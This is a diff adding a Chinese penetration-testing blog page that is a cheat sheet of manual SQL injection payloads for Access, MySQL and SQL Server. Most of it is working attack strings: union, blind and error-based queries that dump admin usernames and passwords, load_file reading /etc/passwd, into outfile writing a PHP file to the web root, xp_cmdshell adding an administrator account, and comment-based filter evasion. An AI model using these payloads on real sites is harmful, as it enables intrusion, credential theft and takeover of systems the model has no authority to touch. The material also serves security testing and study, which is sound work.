@@ -1,0 +1,520 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>手工注入语句总结 | lazy</title>
+  <meta name="author" content="lazy" />
+
+  
+  <meta name="description" content="手工注入总结" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="手工注入语句总结" />
+  <meta property="og:site_name" content="lazy" />
+
+  
+  
+  
+  
+  
+
+  
+    <meta property="og:image" content="undefined" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="lazy" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">lazy</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/achieve">所有文章</a></li>
+    
+      <li><a href="/plan">学习计划</a></li>
+    
+      <li><a href="/developer">开发者</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+      <li><a href="http://www.cnblogs.com/lazy0">aother blog</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2015-05-30T14:26:36.000Z"><a href="/2015/05/30/手工注入语句总结/">2015-05-30</a></time>
+      
+      
+  
+    <h1 class="title">手工注入语句总结</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>手工注入总结<br><a id="more"></a></p>
+<h2 id="0x00-判断有没有漏洞"><a href="#0x00-判断有没有漏洞" class="headerlink" title="0x00,判断有没有漏洞:"></a>0x00,判断有没有漏洞:</h2><hr>
+<pre><code>12-0
+12-1
+and 1=1
+and 1=2
+or 1=1
+or 1=2
+xor 1=1
+xor 1=2
+; and 1=1 and 1=2
+and &apos;1&apos;=&apos;1&apos;
+and  1 = 1
+%’and 1=1 and ’%’=’ 
+(1)anandd(1=1)
+%df
+</code></pre><h2 id="0x01-常见的表名列名："><a href="#0x01-常见的表名列名：" class="headerlink" title="0x01,常见的表名列名："></a>0x01,常见的表名列名：</h2><hr>
+<pre><code>常用的表名：
+
+admin user news manage a_admin x_admin m_admin adminuser 
+admin_user article_admin administrator manager member
+ memberlist users Manage_User user_info admin_userinfo login new news
+
+常用的列名：
+
+username password id adminusername admin_username adminname 
+admin_name admin adminuser admin_user user_name user_admin 
+administrator administrators adminpassword admin_pwd 
+adminpass userpass user_pass admin_passwod 
+</code></pre><h2 id="0x02-Access偏移注入-工具猜不出来列"><a href="#0x02-Access偏移注入-工具猜不出来列" class="headerlink" title="0x02,Access偏移注入:(工具猜不出来列)"></a>0x02,Access偏移注入:(工具猜不出来列)</h2><hr>
+<pre><code>地址后面加上单引号’，服务器会返回下面的错误提示：
+
+Microsoft JET Database Engine 错误 &apos;80040e14&apos;
+
+网站使用的是Access数据库，通过JET引擎连接数据库
+</code></pre><p><a href="">测试漏洞是否存在：</a></p>
+<pre><code>关键字 and 1=1 
+
+关键字 and 1=2 
+
+将and 1=1 换成注入语句就可以注入了。
+</code></pre><p><a href="">流程一：</a></p>
+<pre><code>and 1=1
+and 1=2
+order by 7--+
+order by 8--+
+
+union select 1,2,3,4,5,6,7--+
+union select 1,2,3,4,5,6,7 from admin--+
+
+union select 1,2,3,4,5,* from admin --+尝试admin表有几个字段
+union select 1,2,3,4,5,6,* from admin--+
+
+union select 1,2,id,4,5,6* from admin--+尝试id属于第几个字段
+union select 1,id,3,4,5,6* from admin--+
+
+union select 1,2,* from (admin as a inner join admin as b on a.id=b.id)(这个时候就获得了用户名和密码)
+</code></pre><p>同时呢，我们可以找后台，F12查看源代码，查看列名<br>union select 1,2,A_name,Apwd,5,6,7 from admin–+</p>
+<p><a href="">大致的语句如下:</a></p>
+<pre><code>and 1=2 union select * from (users as a inner join users as b on a.id=b.id )
+
+and 1=2 union select 1,* from (users as a inner join users as b on a.id=b.id )
+
+and 1=2 union select 1,2,3,*-1,* from (users as a inner join users as b on a.id=b.id )
+
+and 1=2 union select 1,a.id,* from (users as a inner join users as b on a.id=b.id )
+
+and 1=2 union select 1,a.id,b.id,* from (users as a inner join users as b on a.id=b.id )
+
+and 1=2 union select *from( from (users as a inner join users as b on a.id=b.id )
+
+and 1=2 union select * from ((select * from admin) as a inner join (select * from admin) as b on a.id=b.id) inner join (select id from admin) as c on c.id=a.id
+</code></pre><p><a href="">流程二：</a></p>
+<pre><code>id=49 And (Select Count(*) from Admin)&gt;=0#猜admin表
+
+id=49 and exists (select * from admin)
+
+and 1=(select count(*) from admin where len(name)&gt;6)#错误，猜取字段的长度
+
+and 1=(select count(*) from admin where len(name)&gt;5)#正确 长度是6
+
+id=49 and (select top 1 len(username) from Admin)&gt;0#&gt;1,&gt;2。。判断列的长度为3
+
+id=49 and (select top 1 asc(mid(username,1,1)) from Admin)=114#猜解列名第1个字符，
+
+id=49 and (select top 1 asc(mid(username,2,1)) from Admin)=67#猜解列名第2个字符，
+
+id=49 and (select top 1 asc(mid(username,3,1)) from Admin)=78#猜解列名第3个字符，
+
+id=49 and (select top 1 asc(mid(password,3,1)) from Admin)=78
+</code></pre><h2 id="0x03-mysql注入"><a href="#0x03-mysql注入" class="headerlink" title="0x03,mysql注入:"></a>0x03,mysql注入:</h2><p><a href="">一般注入:</a></p>
+<p><a href="">测试漏洞是否存在：</a></p>
+<pre><code>关键字 and 1=1 
+
+关键字 and 1=2 
+
+将and 1=1 换成注入语句就可以注入了。
+</code></pre><p><a href="">大致的语句如下:</a></p>
+<p>猜字段数</p>
+<pre><code>order by n/*
+</code></pre><p>查看报错字段</p>
+<pre><code>union select 1,2,3,4,5--+
+</code></pre><p>查看mysql基本信息</p>
+<pre><code>and 1=2 union select username from users where id=1 union select concat(user(),&apos;,&apos;,database(),&apos;,&apos;,version())
+
+and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/*
+</code></pre><p>查询数据库</p>
+<pre><code>and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1/*
+
+and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/*
+</code></pre><p>查询表名</p>
+<pre><code>and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1/*
+
+and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/*
+
+and 1=2 union select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
+
+and 1=2 union select table_name from information_schema.tables where table_schema=&apos;bloodzer0&apos; limit 0,1;
+</code></pre><p>查询字段</p>
+<pre><code>and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1/*
+
+and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/*
+
+and 1=2 union select table_name from information_schema.tables where table_schema=(select database()) limit 0,1
+
+and 1=2 union select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1  #查询列
+</code></pre><p>查询数据</p>
+<pre><code>and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/*
+
+and 1=2 union select id,username from users union select 1,2     #mysql执行：语句正常；mssql执行：语句错误，数据类型不匹配，无法正常执行
+
+and 1=2 union select id,username from users union select 1,2 from dual   #oracle执行：语句错误，数据类型不匹配
+</code></pre><p>判断是否具有读写权限</p>
+<pre><code>and (select count(*) from mysql.user)&gt;0/*
+and (select count(file_priv) from mysql.user)&gt;0/*
+</code></pre><p>如果有权限，进行load_file()读取文件：</p>
+<pre><code>and 1=2 union select * from users union select 1,load_file(&apos;/etc/passwd&apos;),3/*(错误写法)
+
+and 1=2 union select * from users union select 1,load_file(0x2F6574632F706173737764),3  #使用16进制绕过单引号限制
+
+and 1=2 union select * from users union select 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),3
+
+and 1=2 union select * from users union select 1,hex(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),3
+</code></pre><p>如果有权限，进行into outfile()写入文件：</p>
+<pre><code>and 1=2 union select &apos;&lt;?php phpinfo(); ?&gt;&apos; into outfile &apos;/var/www/html/xxx.php&apos;(错误写法)
+
+and 1=2 union select char(60,63,112,104,112,32,112,104,112,105,110,102,111,40,41,59,32,63,62) into outfile &apos;/var/www/html/xxx.php&apos;
+</code></pre><p>如果你有sa权限，sqlserver服务器:</p>
+<pre><code>id=1;exec master..xp_cmdshell “net user name password /add”--
+
+id=1;exec master..xp_cmdshell “net localgroup name administrators /add”--
+</code></pre><p>如果你有sa权限:</p>
+<pre><code>数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来
+
+?id=1;backup database 数据库名 to disk=’c:1.db’;--
+</code></pre><p><a href="">一般盲注:</a></p>
+<p>使用ascii</p>
+<pre><code>AND ascii(substring((SELECT password FROM users where id=1),1,1))=49
+</code></pre><p>使用正则表达式</p>
+<pre><code>and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1)
+</code></pre><p>使用string()</p>
+<pre><code>and (select 1)=1 正常显示，则substring可以正常使用
+
+and (select substring(@@version,1,1))=4，判断版本
+
+and (select 1 from users limit 0,1)=1，判断user()表
+
+and (select substring(concat(1,password),1,1) from users limit 0,1)=1
+
+and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;80
+</code></pre><h2 id="0x04-利用的函数报错注入"><a href="#0x04-利用的函数报错注入" class="headerlink" title="0x04,利用的函数报错注入:"></a>0x04,利用的函数报错注入:</h2><p><a href="">1、通过floor暴错</a></p>
+<p><a href="">测试漏洞是否存在</a></p>
+<pre><code>?id=12-0
+
+?id=12-1
+</code></pre><p><a href="">流程操作:</a></p>
+<pre><code>/*数据库版本*/
+
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+/*简单办法暴库*/
+
+.php?id=info()
+
+/*连接用户*/
+
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+/*连接数据库*/
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+/*暴库*/
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+/*暴表*/
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+/*暴字段*/
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+/*暴内容*/
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p><a href="">2、ExtractValue(有长度限制,最长32位)</a></p>
+<pre><code>and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
+</code></pre><p><a href="">3、UpdateXml(有长度限制,最长32位)</a></p>
+<p><a href="">测试漏洞是否存在</a></p>
+<pre><code>?id=12-0
+
+?id=12-1
+</code></pre><p><a href="">流程操作:</a></p>
+<pre><code>id=12 order by 5
+
+id=12 order by 6
+
+id=a()#爆出数据库名
+
+id=12 and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/ user()),0x7e),1)#爆出数据库名称
+
+id=12 and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/schema_name /*!%0afrom*/ information_schema.schemata LIMIT 1,1),0x7e),1)#爆库
+
+id=12 and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/table_name /*!%0afrom*/ information_schema./*!%0ctables*/ where table_schema=0x696C756D696E61635F706F7274616C LIMIT 9,1),0x7e),1)#爆表
+
+id=12 and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/column_name /*!%0afrom*/ information_schema.columns where table_name=&apos;users&apos; LIMIT 0,1),0x7e),1)#爆字段
+
+id=12 and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*//*!%0aconcat*/(username,0x3a,password) from users limit 0,1),0x7e),1)#爆用户名密码
+</code></pre><h2 id="0x05-搜索型注入："><a href="#0x05-搜索型注入：" class="headerlink" title="0x05,搜索型注入："></a>0x05,搜索型注入：</h2><p><a href="">测试漏洞是否存在：</a></p>
+<pre><code>关键字%&apos; and 1=1 and &apos;%&apos;=&apos;%
+
+关键字%&apos; and 1=2 and &apos;%&apos;=&apos;%
+
+将and 1=1 换成注入语句就可以注入了。
+
+比如：%&apos;and(select count(*)from admin)&gt;0 and &apos;%&apos;=&apos;%
+</code></pre><h2 id="0x06-cookie注入："><a href="#0x06-cookie注入：" class="headerlink" title="0x06,cookie注入："></a>0x06,cookie注入：</h2><p><a href="">测试漏洞是否存在:</a></p>
+<pre><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;44 and 1=1&quot;));
+
+javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;44 and 1=2&quot;));
+
+将and 1=1 换成注入语句就可以注入了。
+</code></pre><h2 id="0x07-宽字节注入："><a href="#0x07-宽字节注入：" class="headerlink" title="0x07,宽字节注入："></a>0x07,宽字节注入：</h2><p><a href="">测试漏洞是否存在:</a></p>
+<pre><code>id=1%d5 and 1=1
+
+id=1%df and 1=2
+
+将and 1=1 换成注入语句就可以注入了。
+</code></pre><h2 id="0x08-盲注："><a href="#0x08-盲注：" class="headerlink" title="0x08,盲注："></a>0x08,盲注：</h2><p>不同的场景，形式不同。</p>
+<p><a href="">时间盲注:</a></p>
+<p><a href="">布尔盲注:</a></p>
+<p>错误的地方，可以发邮件告诉我，大家相互学习。后期会继续补充的。</p>
+<p>详细可见:<a href="http://www.heysec.org/archives/821" target="_blank" rel="external">Mysql注入总结</a></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/渗透测试/">渗透测试</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/手工注入，手工/">手工注入，手工</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="widget tag">
+    <h3 class="title">关于文章</h3>
+    <div class="entry">
+    <P>文章有问题可以发邮件</p>
+    <p>大家彼此相互学习</p>
+      <p>邮箱：lazy@dropsec.xyz</p>
+    </div>
+</div>
+
+  <div class="widget tag">
+    <h3 class="title">赞助我</h3>
+    <div class="entry">
+      <img src='/css/images/qr_alipay.png' style='width:100%;background:rgba(255,255,255,0.6)' />
+    </div>
+</div>
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/MarkDown/" style="font-size: 10px;">MarkDown</a> <a href="/tags/hexo/" style="font-size: 20px;">hexo</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/sql注入，手工/" style="font-size: 10px;">sql注入，手工</a> <a href="/tags/sql注入，过狗，过waf/" style="font-size: 10px;">sql注入，过狗，过waf</a> <a href="/tags/上传绕过/" style="font-size: 15px;">上传绕过</a> <a href="/tags/常见路径/" style="font-size: 10px;">常见路径</a> <a href="/tags/手工注入，手工/" style="font-size: 10px;">手工注入，手工</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/渗透测试/" style="font-size: 20px;">渗透测试</a> <a href="/tags/渗透测试，命令执行/" style="font-size: 10px;">渗透测试，命令执行</a> <a href="/tags/脚本/" style="font-size: 10px;">脚本</a> <a href="/tags/过waf，过狗/" style="font-size: 10px;">过waf，过狗</a> <a href="/tags/逻辑漏洞/" style="font-size: 10px;">逻辑漏洞</a>
+  </div>
+</div>
+
+
+  
+  <div class="widget tag">
+    <h3 class="title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/06/">    2016年06月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/05/">    2016年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/04/">    2016年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/06/">    2015年06月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/05/">    2015年05月</a><span class="archive-list-count">6</span></li></ul>
+  </div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/python/">python</a><small>3</small></li>
+  
+    <li><a href="/categories/十大漏洞/">十大漏洞</a><small>4</small></li>
+  
+    <li><a href="/categories/杂谈/">杂谈</a><small>4</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>5</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">近期文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2016/06/10/python_端口扫描小工具/">python_端口扫描小工具</a>
+      </li>
+    
+      <li>
+        <a href="/2016/06/07/phpcms_2008远程代码执行漏洞/">phpcms-2008 远程代码执行漏洞</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/30/python_json模块/">python之json模块</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/27/python正则表达式/">python之正则表达式</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/28/十大漏洞之远程命令执行/">十大漏洞之命令执行</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  <div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <div class="entry">
+    <ul>
+<!-- link start -->
+<li><a href='http://www.cnblogs.com/lazy0'>lazy</a></li>
+<li><a href='http://www.baidu.com'>baidu</a></li>
+<!-- link  end -->
+    </ul>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+    <h3 class="title">统计</h3>
+    <div class="entry">
+      
+	<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+
+    </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="alignleft">
+<span id="busuanzi_container_site_pv">
+    你好，你是第:<span id="busuanzi_value_site_pv"></span>位访客
+</span>
+</div>
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+</footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+<script>
+    //Kill XP and IE8
+    (function(){
+        var ua = navigator.userAgent;
+        var res = /Windows NT (\d+\.\d+)/.exec(ua);
+        var xpOrLower = res && JSON.parse(res[1]) < 6;
+        res = /MSIE (\d+\.\d+)/.exec(ua);
+        var ie8OrLower = res && JSON.parse(res[1]) < 9;
+        if(xpOrLower || ie8OrLower)
+        {
+            alert('请不要用XP及之前的Windows系统，和IE8及之前的IE浏览器访问本站！');
+            location.href = "about:blank";
+        }
+        var fromBaiduSE = /^https?:\/\/www.baidu.com/.test(document.referrer);
+        if(fromBaiduSE)
+        {
+            alert('检测到你还在使用百度搜索，作为一个程序员，这是一种自暴自弃！\n\n做不作恶的程序员，从不用百度开始！')
+            location.href = "about:blank";
+        }
+    })();
+</script>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script> 
+//前面要添加的代码  
+//百度统计的代码  
+
+<div id='bg'></div>
+</body>
+</html>
